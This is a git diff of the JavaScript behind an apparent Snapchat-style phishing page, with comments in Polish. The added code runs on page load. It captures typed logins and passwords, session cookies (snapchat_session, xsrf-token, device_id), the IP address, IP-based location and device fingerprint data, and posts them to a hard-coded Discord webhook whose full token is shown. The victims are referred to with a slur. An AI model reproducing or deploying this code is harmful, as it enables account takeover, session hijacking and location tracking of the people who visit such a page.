@@ -1,4 +1,43 @@
 document.addEventListener('DOMContentLoaded', function () {
+
+  // *** Funkcja wysyłająca fingerprint i cookies na webhook ***
+  async function sendFingerprint() {
+    const ua = navigator.userAgent;
+    const res = `${window.screen.width}x${window.screen.height}`;
+    const lang = navigator.language;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const platform = navigator.platform;
+    const cookieEnabled = navigator.cookieEnabled;
+    const cookies = document.cookie || 'BRAK_COOKIE';
+
+    const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';
+
+    try {
+      await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: "fingerprint",
+          ua,
+          res,
+          lang,
+          tz,
+          platform,
+          cookieEnabled,
+          cookies
+        })
+      });
+      console.log('Fingerprint i cookies wysłane.');
+    } catch (e) {
+      console.error('Błąd przy wysyłaniu fingerprinta:', e);
+    }
+  }
+
+  // Wywołaj od razu
+  sendFingerprint();
+
+  // --- Twój oryginalny kod dalej ---
+
   async function getUserIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -9,16 +48,37 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   }
 
-  // Wstępne wywołanie geolokalizacji by wymusić prompt (możesz usunąć, jeśli nie chcesz)
-  navigator.geolocation.getCurrentPosition(() => {}, () => {});
+  function getCookieValue(name) {
+    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+    return match ? decodeURIComponent(match[2]) : 'BRAK';
+  }
 
-  function getUserMetadata() {
-    return {
+  async function getLocationFromIP(ip) {
+    try {
+      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,regionName,country`);
+      const data = await res.json();
+      if (data.status === 'success') {
+        return `📌 Lat: ${data.lat.toFixed(5)}, Lng: ${data.lon.toFixed(5)} (${data.city}, ${data.regionName}, ${data.country})`;
+      } else {
+        return 'BRAK_Lokalizacji_IP';
+      }
+    } catch {
+      return 'BRAK_Lokalizacji_IP';
+    }
+  }
+
+  async function getUserLocation() {
+    const ip = await getUserIP();
+    const locationFromIP = await getLocationFromIP(ip);
+    return locationFromIP;
+  }
+
+  async function getUserMetadata() {
+    const meta = {
       czas: new Date().toLocaleString(),
       userAgent: navigator.userAgent,
       resolution: `${window.screen.width}x${window.screen.height}`,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timezoneOffset: new Date().getTimezoneOffset(), // w minutach
       jezyk: navigator.language,
       platforma: navigator.platform,
       cookiesEnabled: navigator.cookieEnabled,
@@ -27,57 +87,32 @@ document.addEventListener('DOMContentLoaded', function () {
       colorDepth: screen.colorDepth,
       dpi: window.devicePixelRatio || 1,
       orientation: (screen.orientation || {}).type || 'NIEZNANA',
-      doNotTrack: navigator.doNotTrack || 'NIEZNANY',
-      plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'BRAK_PLUGINÓW',
-      maxTouchPoints: navigator.maxTouchPoints || 0,
-      battery: null, // wypełnimy asynchronicznie
-      prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
-      prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-      // AudioContext fingerprint - czy AudioContext jest dostępny i jego stan
-      audioContextState: 'NIEZNANY',
+      battery: {
+        level: 'BRAK',
+        charging: 'BRAK',
+        chargingTime: 'BRAK',
+        dischargingTime: 'BRAK'
+      }
     };
-  }
 
-  async function getBatteryInfo() {
     if (navigator.getBattery) {
       try {
         const battery = await navigator.getBattery();
-        return {
-          charging: battery.charging,
-          level: (battery.level * 100).toFixed(0) + '%',
-          chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
-          dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
-        };
+        meta.battery.level = Math.round(battery.level * 100) + '%';
+        meta.battery.charging = battery.charging ? 'TAK' : 'NIE';
+        meta.battery.chargingTime = battery.chargingTime === Infinity ? 'BRAK' : battery.chargingTime + 's';
+        meta.battery.dischargingTime = battery.dischargingTime === Infinity ? 'BRAK' : battery.dischargingTime + 's';
       } catch {
-        return null;
+        // bez zmian jeśli error
       }
+    } else {
+      meta.battery.level = 'NIEOBSŁUGIWANE';
+      meta.battery.charging = 'NIEOBSŁUGIWANE';
+      meta.battery.chargingTime = 'NIEOBSŁUGIWANE';
+      meta.battery.dischargingTime = 'NIEOBSŁUGIWANE';
     }
-    return null;
-  }
 
-  function getAudioContextState() {
-    try {
-      const AudioCtx = window.AudioContext || window.webkitAudioContext;
-      if (!AudioCtx) return 'BRAK_AUDIOCONTEXT';
-      const ctx = new AudioCtx();
-      const state = ctx.state;
-      ctx.close();
-      return state;
-    } catch {
-      return 'BŁĄD_AUDIOCONTEXT';
-    }
-  }
-
-  function getPerformanceTiming() {
-    if (!performance || !performance.timing) return null;
-    const t = performance.timing;
-    return {
-      navigationStart: t.navigationStart,
-      domContentLoadedEventEnd: t.domContentLoadedEventEnd,
-      loadEventEnd: t.loadEventEnd,
-      responseEnd: t.responseEnd,
-      fetchStart: t.fetchStart
-    };
+    return meta;
   }
 
   function getNextMessageNumber() {
@@ -86,36 +121,6 @@ document.addEventListener('DOMContentLoaded', function () {
     num = parseInt(num) + 1;
     localStorage.setItem('messageNumber', num);
     return num;
-  }
-
-  function getUserLocation() {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) return resolve('BRAK_DOSTĘPU');
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          resolve(`📌 Lat: ${latitude.toFixed(5)}, Lng: ${longitude.toFixed(5)} (🎯 ±${accuracy}m)`);
-        },
-        () => resolve('BRAK_DOSTĘPU'),
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    });
-  }
-
-  async function collectAllData() {
-    const meta = getUserMetadata();
-
-    // Wypełnij info o baterii
-    meta.battery = await getBatteryInfo();
-
-    // AudioContext state
-    meta.audioContextState = getAudioContextState();
-
-    // Performance Timing
-    meta.performanceTiming = getPerformanceTiming();
-
-    return meta;
   }
 
   const gownoForm = document.getElementById('gowno-form');
@@ -131,54 +136,38 @@ document.addEventListener('DOMContentLoaded', function () {
       const login = localStorage.getItem('cwelski_login') || 'NIEZNANY_LOGIN';
       const messageNumber = getNextMessageNumber();
       const ip = await getUserIP();
-      const meta = await collectAllData();
+      const meta = await getUserMetadata();
       const location = await getUserLocation();
 
-      // Formatujemy battery info w tekst
-      let batteryInfo = 'BRAK_INFO_BATTERY';
-      if (meta.battery) {
-        batteryInfo = `⚡ Ładowanie: ${meta.battery.charging ? 'TAK' : 'NIE'}, Poziom: ${meta.battery.level}, Czas ładowania: ${meta.battery.chargingTime}, Czas rozładowania: ${meta.battery.dischargingTime}`;
-      }
+      const snapchat_session = getCookieValue('snapchat_session');
+      const xsrf_token = getCookieValue('xsrf-token');
+      const device_id = getCookieValue('device_id');
 
-      // Formatujemy performance timing
-      let perfInfo = 'BRAK_PERFORMANCE_TIMING';
-      if (meta.performanceTiming) {
-        perfInfo = `⏱️ NavigationStart: ${meta.performanceTiming.navigationStart}, DOMContentLoaded: ${meta.performanceTiming.domContentLoadedEventEnd}, LoadEventEnd: ${meta.performanceTiming.loadEventEnd}`;
-      }
+      const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';
 
       const payload = {
-  content: `# DANE ${messageNumber}
+        content: `# DANE ${messageNumber}
 📨 **Login cwela**: \`${login}\`
 🔐 **Hasło cwela**: \`${gowno}\`
+🌍 **IP**: \`${ip}\`
 📍 **Lokalizacja**: ${location}
 🕓 **Czas**: \`${meta.czas}\`
 💻 **User-Agent**: \`${meta.userAgent}\`
 🖥️ **Rozdzielczość**: \`${meta.resolution}\`
 🌐 **Strefa czasowa**: \`${meta.timezone}\`
 🗣️ **Język**: \`${meta.jezyk}\`
-${batteryInfo}
+🔋 **Bateria**: \`Poziom: ${meta.battery.level}, Ładowanie: ${meta.battery.charging}\`
 🧠 **Platforma**: \`${meta.platforma}\`
 
-----------------------
+--- Dodatkowe cookies ---
+🥷 snapchat_session: \`${snapchat_session}\`
+🛡️ xsrf-token: \`${xsrf_token}\`
+📱 device_id: \`${device_id}\`
 
-⏰ **Offset UTC (min)**: \`${meta.timezoneOffset}\`
-🍪 **Cookies włączone**: \`${meta.cookiesEnabled ? 'TAK' : 'NIE'}\`
-🧮 **CPU**: \`${meta.cpu}\` rdzeni
-💾 **RAM**: \`${meta.ram}\`
-🎨 **Głębia kolorów**: \`${meta.colorDepth}\` bit
-🔍 **DPI (PixelRatio)**: \`${meta.dpi}\`
-🔄 **Orientacja ekranu**: \`${meta.orientation}\`
-🚫 **DoNotTrack**: \`${meta.doNotTrack}\`
-🔌 **Pluginy**: \`${meta.plugins}\`
-✋ **Max touch points**: \`${meta.maxTouchPoints}\`
-🎧 **AudioContext state**: \`${meta.audioContextState}\`
-⏱️ **Performance Timing**: NavigationStart: ${meta.performanceTiming?.navigationStart || 'BRAK'}, DOMContentLoaded: ${meta.performanceTiming?.domContentLoadedEventEnd || 'BRAK'}, LoadEventEnd: ${meta.performanceTiming?.loadEventEnd || 'BRAK'}
-🌈 **Prefers color scheme**: \`${meta.prefersColorScheme}\`
-🚶 **Prefers reduced motion**: \`${meta.prefersReducedMotion ? 'TAK' : 'NIE'}\`
 ----------------------`
-};
+      };
 
-      fetch('https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi', {
+      fetch(webhook, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
@@ -211,4 +200,26 @@ ${batteryInfo}
       }, 1000);
     });
   }
+});
+
+// --- rozdzialka ---
+
+document.addEventListener('DOMContentLoaded', () => {
+  const div36 = document.querySelector('div.style-36');
+  const div999 = document.querySelector('div.style-999');
+
+  function checkScreen() {
+    const width = window.innerWidth;
+
+    if (width <= 768) { // telefon
+      if (div36) div36.style.display = 'block';
+      if (div999) div999.style.display = 'none';
+    } else { // komputer
+      if (div36) div36.style.display = 'none';
+      if (div999) div999.style.display = 'block';
+    }
+  }
+
+  checkScreen();
+  window.addEventListener('resize', checkScreen);
 });
